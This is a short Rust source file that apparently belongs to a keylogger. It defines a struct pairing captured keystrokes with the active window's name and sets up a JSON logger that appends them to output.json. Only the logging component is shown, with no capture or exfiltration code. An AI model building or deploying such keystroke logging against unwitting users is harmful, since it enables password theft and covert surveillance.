use std::fs::OpenOptions;
use std::io::LineWriter;

use structured_logger::Builder;
use structured_logger::json::new_writer;

use serde::Serialize;


#[derive(Serialize)]
pub struct LogText{
    keys_pressed: String,
    window_name: String
}

impl LogText {
    pub fn new(keys: String, window_name: String) -> Self {
        LogText {
            keys_pressed: keys,
            window_name: window_name
        }
    }
}


pub fn init_logger() -> Result<(), Box<dyn std::error::Error>>{
    let file = match OpenOptions::new()
                .create(true) // Create the file if it doesn't exist
                .append(true)
                .open("output.json") {
                    Ok(file) => file,
                    Err(err) => {
                        log::error!("Failed to open output file: {}", err);
                        return Err(Box::new(err));
                    }
                };
                    

    let line_writer = LineWriter::new(file);
 
    Builder::with_level("TRACE").with_target_writer(&String::from("*"), new_writer(line_writer)).init();
    log::info!("Program Started");
    Ok(())
}
